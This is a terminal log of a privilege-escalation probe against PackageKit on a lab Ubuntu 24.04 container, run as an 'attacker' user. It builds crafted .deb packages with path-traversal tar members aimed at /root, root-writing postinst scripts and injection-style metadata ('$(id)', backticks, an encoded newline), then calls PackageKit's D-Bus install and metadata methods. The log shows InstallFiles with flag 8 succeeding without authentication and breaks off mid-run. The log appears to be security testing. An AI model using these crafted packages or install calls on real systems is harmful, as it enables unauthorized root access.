PackageKit local .deb parser/metadata probe
target=ubuntu24-server-lpe-target attacker=attacker selfauth=selfauth
2026-05-16T12:52:09-0400

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== cleanup before probe =="\ndpkg -r pk-local-normal pk-local-weird pk-local-control-traversal pk-local-data-traversal 2>/dev/null || true\nrm -rf /tmp/packagekit-local-deb-parser\nrm -f /root/packagekit_local_deb_parser_*\nsystemctl reset-failed packagekit.service polkit.service dbus.service 2>/dev/null || true\n'
== cleanup before probe ==

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== target identity and package versions =="\ncat /etc/os-release\nuname -a\nid attacker\nid selfauth || true\ndpkg-query -W -f="\\${binary:Package}\\t\\${Version}\\t\\${Architecture}\\n" \\\n  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \\\n  python3-gi polkitd dbus dbus-daemon systemd dpkg tar xz-utils 2>&1 | sort\necho\necho "== PackageKit service/default D-Bus reachability =="\nsystemctl cat packagekit.service\nls -l /run/dbus/system_bus_socket /var/run/dbus/system_bus_socket 2>/dev/null || true\nbusctl --system list | grep -E "org.freedesktop.(PackageKit|PolicyKit1)|polkit" || true\necho\necho "== PackageKit transaction methods =="\nsed -n "422,466p;739,780p" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml\necho\necho "== package install policy =="\ngrep -n -A8 -B3 "package-install-untrusted" /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy | sed -n "1,80p"\n'
== target identity and package versions ==
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
Linux 4f5b414436ae 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
dbus	1.14.10-4ubuntu4.1	arm64
dbus-daemon	1.14.10-4ubuntu4.1	arm64
dpkg	1.22.6ubuntu6.6	arm64
gir1.2-packagekitglib-1.0	1.2.8-2ubuntu1.5	arm64
libpackagekit-glib2-18:arm64	1.2.8-2ubuntu1.5	arm64
packagekit	1.2.8-2ubuntu1.5	arm64
packagekit-tools	1.2.8-2ubuntu1.5	arm64
polkitd	124-2ubuntu1.24.04.3	arm64
python3-gi	3.48.2-1	arm64
systemd	255.4-1ubuntu8.15	arm64
tar	1.35+dfsg-3build1	arm64
xz-utils	5.6.1+really5.4.5-1ubuntu0.2	arm64

== PackageKit service/default D-Bus reachability ==
# /usr/lib/systemd/system/packagekit.service
[Unit]
Description=PackageKit Daemon
# PK doesn't know how to do anything on ostree-managed systems;
# currently the design is to have dedicated daemons like
# eos-updater and rpm-ostree, and gnome-software talks to those.
ConditionPathExists=!/run/ostree-booted
Wants=network-online.target

[Service]
Type=dbus
BusName=org.freedesktop.PackageKit
User=root
ExecStart=/usr/libexec/packagekitd
srw-rw-rw- 1 root root 0 May 16 15:18 /run/dbus/system_bus_socket
srw-rw-rw- 1 root root 0 May 16 15:18 /var/run/dbus/system_bus_socket
:1.4                             258 polkitd         polkitd         :1.4          polkit.service              -       -
org.freedesktop.PackageKit    731642 packagekitd     root            :1.97223      packagekit.service          -       -
org.freedesktop.PolicyKit1       258 polkitd         polkitd         :1.4          polkit.service              -       -

== PackageKit transaction methods ==
    <method name="GetDetailsLocal">
      <annotation name="org.freedesktop.DBus.GLib.Async" value=""/>
      <doc:doc>
        <doc:description>
          <doc:para>
            This method should return all the details about a specific
            local file.
          </doc:para>
          <doc:para>
            This method typically emits
            <doc:tt>Progress</doc:tt>,
            <doc:tt>Status</doc:tt> and
            <doc:tt>Error</doc:tt> and
            <doc:tt>Details</doc:tt>.
          </doc:para>
        </doc:description>
      </doc:doc>
      <arg type="as" name="files" direction="in">
        <doc:doc>
          <doc:summary>
            <doc:para>
              An array of filenames.
            </doc:para>
          </doc:summary>
        </doc:doc>
      </arg>
    </method>

    <!--*********************************************************************-->
    <method name="GetFilesLocal">
      <annotation name="org.freedesktop.DBus.GLib.Async" value=""/>
      <doc:doc>
        <doc:description>
          <doc:para>
            This method should return all the file lists for a specific
            local file.
          </doc:para>
          <doc:para>
            This method typically emits
            <doc:tt>Progress</doc:tt>,
            <doc:tt>Status</doc:tt> and
            <doc:tt>Error</doc:tt> and
            <doc:tt>Details</doc:tt>.
          </doc:para>
        </doc:description>
    <method name="InstallFiles">
      <annotation name="org.freedesktop.DBus.GLib.Async" value=""/>
      <doc:doc>
        <doc:description>
          <doc:para>
            This method installs local package files onto the local system.
          </doc:para>
          <doc:para>
            The installer should always install extra dependant packages automatically.
          </doc:para>
          <doc:para>
            This method typically emits
            <doc:tt>Progress</doc:tt>,
            <doc:tt>Status</doc:tt> and
            <doc:tt>Error</doc:tt> and
            <doc:tt>Package</doc:tt>.
          </doc:para>
          <doc:para>
            <doc:tt>Package</doc:tt> enumerated types should be
            <doc:tt>downloading</doc:tt>,
            <doc:tt>updating</doc:tt>,
            <doc:tt>installing</doc:tt> or
            <doc:tt>removing</doc:tt>.
          </doc:para>
        </doc:description>
        <doc:permission>Callers need the org.freedesktop.packagekit.localinstall-untrusted</doc:permission>
      </doc:doc>
      <arg type="t" name="transaction_flags" direction="in">
        <doc:doc>
          <doc:summary>
            <doc:para>
              If the transaction is only allowed to install trusted files.
              Unsigned files should not be installed if this parameter is <doc:tt>TRUE</doc:tt>.
            </doc:para>
            <doc:para>
              If this method is can only install trusted files, and the files are unsigned, then
              the backend will send a <doc:tt>ErrorCode(missing-gpg-signature)</doc:tt>.
            </doc:para>
          </doc:summary>
        </doc:doc>
      </arg>
      <arg type="as" name="full_paths" direction="in">

== package install policy ==
228-      <allow_active>auth_admin_keep</allow_active>
229-    </defaults>
230-  </action>
231:  <action id="org.freedesktop.packagekit.package-install-untrusted">
232-    <!-- SECURITY:
233-          - Normal users require admin authentication to install untrusted or
234-            unrecognised packages, as allowing users to do this without a
235-            password would be a massive security hole.
236-          - This is not retained as each package should be authenticated.
237-     -->
238-    <description>Install untrusted local file</description>
239-    <description xml:lang="zh_TW">安裝未信任的本地檔案</description>

$ docker exec ubuntu24-server-lpe-target runuser -u attacker -- bash -lc $'\nset -euo pipefail\necho "== user reachability: $(id) =="\nloginctl user-status "$(id -u)" 2>&1 | sed -n "1,30p" || true\npkcheck --action-id org.freedesktop.packagekit.package-install-untrusted --process "$$" 2>&1 || true\ntx=$(gdbus call --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path /org/freedesktop/PackageKit \\\n  --method org.freedesktop.PackageKit.CreateTransaction |\n  sed -n "s/.*objectpath \'\\([^\' ]*\\)\'.*/\\1/p")\necho "transaction=$tx"\ngdbus call --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path "$tx" \\\n  --method org.freedesktop.DBus.Properties.GetAll \\\n  org.freedesktop.PackageKit.Transaction\ngdbus introspect --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path "$tx" |\n  sed -n "/GetDetailsLocal/,/InstallFiles/p"\n'
== user reachability: uid=1001(attacker) gid=1001(attacker) groups=1001(attacker) ==
Failed to get user: User ID 1001 is not logged in or lingering
Authorization requires authentication and -u wasn't passed.
transaction=/29_ceebdaec
({'Role': <uint32 0>, 'Status': <uint32 1>, 'LastPackage': <''>, 'Uid': <uint32 1001>, 'Sender': <':1.97251'>, 'Percentage': <uint32 101>, 'AllowCancel': <true>, 'CallerActive': <false>, 'ElapsedTime': <uint32 0>, 'RemainingTime': <uint32 0>, 'Speed': <uint32 0>, 'DownloadSizeRemaining': <uint64 0>, 'TransactionFlags': <uint64 0>},)
      GetDetailsLocal(in  as files);
      @org.freedesktop.DBus.GLib.Async("")
      GetFilesLocal(in  as files);
      @org.freedesktop.DBus.GLib.Async("")
      GetFiles(in  as package_ids);
      GetOldTransactions(in  u number);
      @org.freedesktop.DBus.GLib.Async("")
      GetPackages(in  t filter);
      @org.freedesktop.DBus.GLib.Async("")
      GetRepoList(in  t filter);
      @org.freedesktop.DBus.GLib.Async("")
      RequiredBy(in  t filter,
                 in  as package_ids,
                 in  b recursive);
      @org.freedesktop.DBus.GLib.Async("")
      GetUpdateDetail(in  as package_ids);
      @org.freedesktop.DBus.GLib.Async("")
      GetUpdates(in  t filter);
      @org.freedesktop.DBus.GLib.Async("")
      GetDistroUpgrades();
      @org.freedesktop.DBus.GLib.Async("")
      InstallFiles(in  t transaction_flags,

$ docker exec ubuntu24-server-lpe-target runuser -u selfauth -- bash -lc $'\nset -euo pipefail\necho "== user reachability: $(id) =="\nloginctl user-status "$(id -u)" 2>&1 | sed -n "1,30p" || true\npkcheck --action-id org.freedesktop.packagekit.package-install-untrusted --process "$$" 2>&1 || true\ntx=$(gdbus call --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path /org/freedesktop/PackageKit \\\n  --method org.freedesktop.PackageKit.CreateTransaction |\n  sed -n "s/.*objectpath \'\\([^\' ]*\\)\'.*/\\1/p")\necho "transaction=$tx"\ngdbus call --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path "$tx" \\\n  --method org.freedesktop.DBus.Properties.GetAll \\\n  org.freedesktop.PackageKit.Transaction\ngdbus introspect --system \\\n  --dest org.freedesktop.PackageKit \\\n  --object-path "$tx" |\n  sed -n "/GetDetailsLocal/,/InstallFiles/p"\n'
== user reachability: uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth) ==
selfauth (1002)
  Since: Sat 2026-05-16 16:52:06 UTC; 2s ago
  State: closing
 Linger: no
   Unit: user-1002.slice

May 16 16:52:06 4f5b414436ae systemd[731843]: Closed gpg-agent.socket - GnuPG cryptographic agent and passphrase cache.
May 16 16:52:06 4f5b414436ae systemd[731843]: Closed keyboxd.socket - GnuPG public key management service.
May 16 16:52:06 4f5b414436ae systemd[731843]: Closed pk-debconf-helper.socket - debconf communication socket.
May 16 16:52:06 4f5b414436ae systemd[731843]: Closed snapd.session-agent.socket - REST API socket for snapd user session agent.
May 16 16:52:06 4f5b414436ae systemd[731843]: Closed gpg-agent-ssh.socket - GnuPG cryptographic agent (ssh-agent emulation).
May 16 16:52:06 4f5b414436ae systemd[731843]: Removed slice app.slice - User Application Slice.
May 16 16:52:06 4f5b414436ae systemd[731843]: Reached target shutdown.target - Shutdown.
May 16 16:52:06 4f5b414436ae systemd[731843]: Finished systemd-exit.service - Exit the Session.
May 16 16:52:06 4f5b414436ae systemd[731843]: Reached target exit.target - Exit the Session.
May 16 16:52:06 4f5b414436ae (sd-pam)[731844]: pam_unix(systemd-user:session): session closed for user selfauth
Authorization requires authentication and -u wasn't passed.
transaction=/30_dcdaceee
({'Role': <uint32 0>, 'Status': <uint32 1>, 'LastPackage': <''>, 'Uid': <uint32 1002>, 'Sender': <':1.97256'>, 'Percentage': <uint32 101>, 'AllowCancel': <true>, 'CallerActive': <false>, 'ElapsedTime': <uint32 0>, 'RemainingTime': <uint32 0>, 'Speed': <uint32 0>, 'DownloadSizeRemaining': <uint64 0>, 'TransactionFlags': <uint64 0>},)
      GetDetailsLocal(in  as files);
      @org.freedesktop.DBus.GLib.Async("")
      GetFilesLocal(in  as files);
      @org.freedesktop.DBus.GLib.Async("")
      GetFiles(in  as package_ids);
      GetOldTransactions(in  u number);
      @org.freedesktop.DBus.GLib.Async("")
      GetPackages(in  t filter);
      @org.freedesktop.DBus.GLib.Async("")
      GetRepoList(in  t filter);
      @org.freedesktop.DBus.GLib.Async("")
      RequiredBy(in  t filter,
                 in  as package_ids,
                 in  b recursive);
      @org.freedesktop.DBus.GLib.Async("")
      GetUpdateDetail(in  as package_ids);
      @org.freedesktop.DBus.GLib.Async("")
      GetUpdates(in  t filter);
      @org.freedesktop.DBus.GLib.Async("")
      GetDistroUpgrades();
      @org.freedesktop.DBus.GLib.Async("")
      InstallFiles(in  t transaction_flags,

$ docker exec ubuntu24-server-lpe-target runuser -u attacker -- bash -lc $'\nset -Eeuo pipefail\nwork=/tmp/packagekit-local-deb-parser\nrm -rf "$work"\nmkdir -p "$work"/{normal,normal/DEBIAN,normal/usr/local/share/packagekit-local-deb-parser,weird,weird/DEBIAN,weird/usr/local/share/packagekit-local-deb-parser,manual}\n\ncat > "$work/normal/DEBIAN/control" <<\\EOF\nPackage: pk-local-normal\nVersion: 1.0\nSection: misc\nPriority: optional\nArchitecture: all\nMaintainer: Parser Probe <probe@example.invalid>\nDescription: normal local parser package\n Confirms metadata parsing does not run maintainer scripts.\nEOF\ncat > "$work/normal/DEBIAN/postinst" <<\\EOF\n#!/bin/sh\nset -eu\n{\n  echo normal-postinst-ran\n  date -Is\n  id\n} > /root/packagekit_local_deb_parser_postinst\nchmod 0600 /root/packagekit_local_deb_parser_postinst\nEOF\nchmod 0755 "$work/normal/DEBIAN/postinst"\nprintf "normal payload\\n" > "$work/normal/usr/local/share/packagekit-local-deb-parser/payload.txt"\ndpkg-deb --build "$work/normal" "$work/pk-local-normal.deb"\n\ncat > "$work/weird/DEBIAN/control" <<\\EOF\nPackage: pk-local-weird\nVersion: 1.0+meta~probe\nSection: misc\nPriority: optional\nArchitecture: all\nMaintainer: Weird, Parser <probe@example.invalid>\nHomepage: file:///tmp/packagekit-local-deb-parser/%0a/root/packagekit_local_deb_parser_homepage\nDescription: weird local metadata package with parser punctuation\n Continuation line with semicolons ;;;;;, percent escapes %n %s %x,\n unicode-looking bytes kept ascii, shell-looking text $(id), backticks `id`,\n and absolute paths /root/packagekit_local_deb_parser_metadata.\n .\n Final paragraph for multiline metadata.\nEOF\ncat > "$work/weird/DEBIAN/postinst" <<\\EOF\n#!/bin/sh\nid > /root/packagekit_local_deb_parser_weird_postinst\nEOF\nchmod 0755 "$work/weird/DEBIAN/postinst"\nprintf "weird payload\\n" > "$work/weird/usr/local/share/packagekit-local-deb-parser/weird.txt"\ndpkg-deb --build "$work/weird" "$work/pk-local-weird.deb"\n\npython3 - <<\\PY\nimport io\nimport os\nimport tarfile\nimport time\n\nwork = "/tmp/packagekit-local-deb-parser"\n\ndef tar_blob(entries):\n    bio = io.BytesIO()\n    with tarfile.open(fileobj=bio, mode="w") as tf:\n        for name, data, mode, typ in entries:\n            ti = tarfile.TarInfo(name)\n            ti.mode = mode\n            ti.uid = 0\n            ti.gid = 0\n            ti.mtime = 1710000000\n            if typ == "file":\n                payload = data.encode()\n                ti.size = len(payload)\n                tf.addfile(ti, io.BytesIO(payload))\n            elif typ == "symlink":\n                ti.type = tarfile.SYMTYPE\n                ti.linkname = data\n                tf.addfile(ti)\n            else:\n                raise ValueError(typ)\n    return bio.getvalue()\n\ndef ar_member(name, data):\n    encoded = name.encode()\n    if len(encoded) > 15:\n        raise ValueError(name)\n    header = (\n        encoded.ljust(16, b" ")\n        + str(int(time.time())).encode().ljust(12, b" ")\n        + b"0     "\n        + b"0     "\n        + b"100644  "\n        + str(len(data)).encode().ljust(10, b" ")\n        + b"`\\n"\n    )\n    pad = b"\\n" if len(data) % 2 else b""\n    return header + data + pad\n\ndef write_deb(path, control_entries, data_entries):\n    blob = b"!<arch>\\n"\n    blob += ar_member("debian-binary", b"2.0\\n")\n    blob += ar_member("control.tar", tar_blob(control_entries))\n    blob += ar_member("data.tar", tar_blob(data_entries))\n    with open(path, "wb") as f:\n        f.write(blob)\n    os.chmod(path, 0o644)\n\nbase_control = """Package: pk-local-control-traversal\nVersion: 1.0\nSection: misc\nPriority: optional\nArchitecture: all\nMaintainer: Parser Probe <probe@example.invalid>\nDescription: control tar traversal parser package\n Attempts to prove whether root PackageKit extracts control members unsafely.\n"""\n\nwrite_deb(\n    os.path.join(work, "pk-local-control-traversal.deb"),\n    [\n        ("./control", base_control, 0o644, "file"),\n        ("./postinst", "#!/bin/sh\\nid > /root/packagekit_local_deb_parser_control_postinst\\n", 0o755, "file"),\n        ("../../root/packagekit_local_deb_parser_control_parent_escape", "control parent escape\\n", 0o600, "file"),\n        ("/root/packagekit_local_deb_parser_control_absolute_escape", "control absolute escape\\n", 0o600, "file"),\n        ("./control-symlink", "/root/packagekit_local_deb_parser_control_symlink_escape", 0o777, "symlink"),\n    ],\n    [("./usr/local/share/packagekit-local-deb-parser/control.txt", "control traversal payload\\n", 0o644, "file")],\n)\n\nbase_control = """Package: pk-local-data-traversal\nVersion: 1.0\nSection: misc\nPriority: optional\nArchitecture: all\nMaintainer: Parser Probe <probe@example.invalid>\nDescription: data tar traversal parser package\n Attempts to prove whether metadata/file-list code extracts data members unsafely.\n"""\n\nwrite_deb(\n    os.path.join(work, "pk-local-data-traversal.deb"),\n    [\n        ("./control", base_control, 0o644, "file"),\n        ("./postinst", "#!/bin/sh\\nid > /root/packagekit_local_deb_parser_data_postinst\\n", 0o755, "file"),\n    ],\n    [\n        ("./usr/local/share/packagekit-local-deb-parser/data.txt", "data traversal payload\\n", 0o644, "file"),\n        ("../../root/packagekit_local_deb_parser_data_parent_escape", "data parent escape\\n", 0o600, "file"),\n        ("/root/packagekit_local_deb_parser_data_absolute_escape", "data absolute escape\\n", 0o600, "file"),\n    ],\n)\nPY\n\nls -l "$work"/*.deb\nfor deb in "$work"/*.deb; do\n  echo "== dpkg-deb metadata for $deb =="\n  dpkg-deb -I "$deb" 2>&1 | sed -n "1,80p" || true\n  echo "== dpkg-deb contents for $deb =="\n  dpkg-deb -c "$deb" 2>&1 | sed -n "1,80p" || true\ndone\n'
dpkg-deb: building package 'pk-local-normal' in '/tmp/packagekit-local-deb-parser/pk-local-normal.deb'.
dpkg-deb: building package 'pk-local-weird' in '/tmp/packagekit-local-deb-parser/pk-local-weird.deb'.
-rw-r--r-- 1 attacker attacker 20672 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb
-rw-r--r-- 1 attacker attacker 20672 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb
-rw-r--r-- 1 attacker attacker   762 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-normal.deb
-rw-r--r-- 1 attacker attacker   884 May 16 16:52 /tmp/packagekit-local-deb-parser/pk-local-weird.deb
== dpkg-deb metadata for /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
 new Debian package, version 2.0.
 size 20672 bytes: control archive=10240 bytes.
tar: Removing leading `../../' from member names
tar: ../../root/packagekit_local_deb_parser_control_parent_escape: Member name contains '..'
tar: Removing leading `/' from member names
tar: Exiting with failure status due to previous errors
dpkg-deb: error: tar subprocess returned error exit status 2
== dpkg-deb contents for /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
-rw-r--r-- 0/0              26 2024-03-09 16:00 ./usr/local/share/packagekit-local-deb-parser/control.txt
== dpkg-deb metadata for /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
 new Debian package, version 2.0.
 size 20672 bytes: control archive=10240 bytes.
     276 bytes,     8 lines      control
      63 bytes,     2 lines   *  postinst             #!/bin/sh
 Package: pk-local-data-traversal
 Version: 1.0
 Section: misc
 Priority: optional
 Architecture: all
 Maintainer: Parser Probe <probe@example.invalid>
 Description: data tar traversal parser package
  Attempts to prove whether metadata/file-list code extracts data members unsafely.
== dpkg-deb contents for /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb ==
-rw-r--r-- 0/0              23 2024-03-09 16:00 ./usr/local/share/packagekit-local-deb-parser/data.txt
tar: Removing leading `../../' from member names
-rw------- 0/0              19 2024-03-09 16:00 ../../root/packagekit_local_deb_parser_data_parent_escape
tar: Removing leading `/' from member names
-rw------- 0/0              21 2024-03-09 16:00 /root/packagekit_local_deb_parser_data_absolute_escape
== dpkg-deb metadata for /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
 new Debian package, version 2.0.
 size 762 bytes: control archive=382 bytes.
     239 bytes,     8 lines      control
     164 bytes,     8 lines   *  postinst             #!/bin/sh
 Package: pk-local-normal
 Version: 1.0
 Section: misc
 Priority: optional
 Architecture: all
 Maintainer: Parser Probe <probe@example.invalid>
 Description: normal local parser package
  Confirms metadata parsing does not run maintainer scripts.
== dpkg-deb contents for /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/local/
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/local/share/
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/local/share/packagekit-local-deb-parser/
-rw-r--r-- attacker/attacker 15 2026-05-16 16:52 ./usr/local/share/packagekit-local-deb-parser/payload.txt
== dpkg-deb metadata for /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
 new Debian package, version 2.0.
 size 884 bytes: control archive=506 bytes.
     564 bytes,    13 lines      control
      64 bytes,     2 lines   *  postinst             #!/bin/sh
 Package: pk-local-weird
 Version: 1.0+meta~probe
 Section: misc
 Priority: optional
 Architecture: all
 Maintainer: Weird, Parser <probe@example.invalid>
 Homepage: file:///tmp/packagekit-local-deb-parser/%0a/root/packagekit_local_deb_parser_homepage
 Description: weird local metadata package with parser punctuation
  Continuation line with semicolons ;;;;;, percent escapes %n %s %x,
  unicode-looking bytes kept ascii, shell-looking text $(id), backticks `id`,
  and absolute paths /root/packagekit_local_deb_parser_metadata.
  .
  Final paragraph for multiline metadata.
== dpkg-deb contents for /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/local/
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/local/share/
drwxr-xr-x attacker/attacker 0 2026-05-16 16:52 ./usr/local/share/packagekit-local-deb-parser/
-rw-r--r-- attacker/attacker 14 2026-05-16 16:52 ./usr/local/share/packagekit-local-deb-parser/weird.txt

$ docker exec -i ubuntu24-server-lpe-target bash -lc cat\ \>\ /tmp/packagekit-local-deb-parser/pk_local_parser_driver.py\ \&\&\ chown\ attacker:attacker\ /tmp/packagekit-local-deb-parser/pk_local_parser_driver.py\ \&\&\ chmod\ 0755\ /tmp/packagekit-local-deb-parser/pk_local_parser_driver.py

$ docker exec ubuntu24-server-lpe-target runuser -u attacker -- bash -lc $'\nset -euo pipefail\necho "== PackageKit local parser D-Bus drive as $(id) =="\n/tmp/packagekit-local-deb-parser/pk_local_parser_driver.py \\\n  /tmp/packagekit-local-deb-parser/pk-local-normal.deb \\\n  /tmp/packagekit-local-deb-parser/pk-local-weird.deb \\\n  /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb \\\n  /tmp/packagekit-local-deb-parser/pk-local-data-traversal.deb\n'
== PackageKit local parser D-Bus drive as uid=1001(attacker) gid=1001(attacker) groups=1001(attacker) ==
driver uid props: system-bus connected, files=4

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/31_bcbeadea props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /31_bcbeadea org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-normal;1.0;all;local', 'group': 20, 'summary': 'normal local parser package', 'description': 'Confirms metadata parsing does not run maintainer scripts.', 'url': '', 'license': 'unknown', 'size': 762},)
signal /31_bcbeadea org.freedesktop.PackageKit.Transaction.Finished (1, 12)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/32_ebbcbcdb props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /32_ebbcbcdb org.freedesktop.PackageKit.Transaction.Files ('pk-local-normal;1.0;all;/tmp/packagekit-local-deb-parser/pk-local-normal.deb', ['/', '/usr', '/usr/local', '/usr/local/share', '/usr/local/share/packagekit-local-deb-parser', '/usr/local/share/packagekit-local-deb-parser/payload.txt'])
signal /32_ebbcbcdb org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/33_adcdbcaa props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /33_adcdbcaa org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-normal;1.0;all;+manual:local', 'normal local parser package')
signal /33_adcdbcaa org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-normal;1.0;all;+manual:local', 8, 0)
signal /33_adcdbcaa org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-normal;1.0;all;+manual:local', 'normal local parser package')
signal /33_adcdbcaa org.freedesktop.PackageKit.Transaction.Finished (1, 21)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-normal.deb ==
tx=/34_ccaaaaab props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /34_ccaaaaab org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /34_ccaaaaab org.freedesktop.PackageKit.Transaction.Finished (2, 0)

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/35_aeabcacb props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /35_aeabcacb org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-weird;1.0+meta~probe;all;local', 'group': 20, 'summary': 'weird local metadata package with parser punctuation', 'description': 'Continuation line with semicolons ;;;;;, percent escapes %n %s %x, unicode-looking bytes kept ascii, shell-looking text $(id), backticks `id`, and absolute paths /root/packagekit_local_deb_parser_metadata.\n\nFinal paragraph for multiline metadata.', 'url': 'file:///tmp/packagekit-local-deb-parser/%0a/root/packagekit_local_deb_parser_homepage', 'license': 'unknown', 'size': 884},)
signal /35_aeabcacb org.freedesktop.PackageKit.Transaction.Finished (1, 13)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/36_eabebceb props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /36_eabebceb org.freedesktop.PackageKit.Transaction.Files ('pk-local-weird;1.0+meta~probe;all;/tmp/packagekit-local-deb-parser/pk-local-weird.deb', ['/', '/usr', '/usr/local', '/usr/local/share', '/usr/local/share/packagekit-local-deb-parser', '/usr/local/share/packagekit-local-deb-parser/weird.txt'])
signal /36_eabebceb org.freedesktop.PackageKit.Transaction.Finished (1, 0)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/37_cbacdada props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=8: ok
signal /37_cbacdada org.freedesktop.PackageKit.Transaction.Package (10, 'pk-local-weird;1.0+meta~probe;all;+manual:local', 'weird local metadata package with parser punctuation')
signal /37_cbacdada org.freedesktop.PackageKit.Transaction.ItemProgress ('pk-local-weird;1.0+meta~probe;all;+manual:local', 8, 0)
signal /37_cbacdada org.freedesktop.PackageKit.Transaction.Package (18, 'pk-local-weird;1.0+meta~probe;all;+manual:local', 'weird local metadata package with parser punctuation')
signal /37_cbacdada org.freedesktop.PackageKit.Transaction.Finished (1, 21)

== InstallFiles /tmp/packagekit-local-deb-parser/pk-local-weird.deb ==
tx=/38_bceeedea props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply InstallFiles flags=0: ok
signal /38_bceeedea org.freedesktop.PackageKit.Transaction.ErrorCode (48, 'Failed to obtain authentication.')
signal /38_bceeedea org.freedesktop.PackageKit.Transaction.Finished (2, 0)

== GetDetailsLocal /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/39_bbeacadd props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetDetailsLocal: ok
signal /39_bbeacadd org.freedesktop.PackageKit.Transaction.Details ({'package-id': 'pk-local-control-traversal;1.0;all;local', 'group': 20, 'summary': 'control tar traversal parser package', 'description': 'Attempts to prove whether root PackageKit extracts control members unsafely.', 'url': '', 'license': 'unknown', 'size': 20672},)
signal /39_bbeacadd org.freedesktop.PackageKit.Transaction.Finished (1, 12)

== GetFilesLocal /tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb ==
tx=/40_aacacccc props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
SetHints interactive=false: ok
method_reply GetFilesLocal: ok
signal /40_aacacccc org.freedesktop.PackageKit.Transaction.Files ('pk-local-control-traversal;1.0;all;/tmp/packagekit-local-deb-parser/pk-local-control-traversal.deb', ['/usr/local/share/packagekit-local-deb-parser/control.txt'])
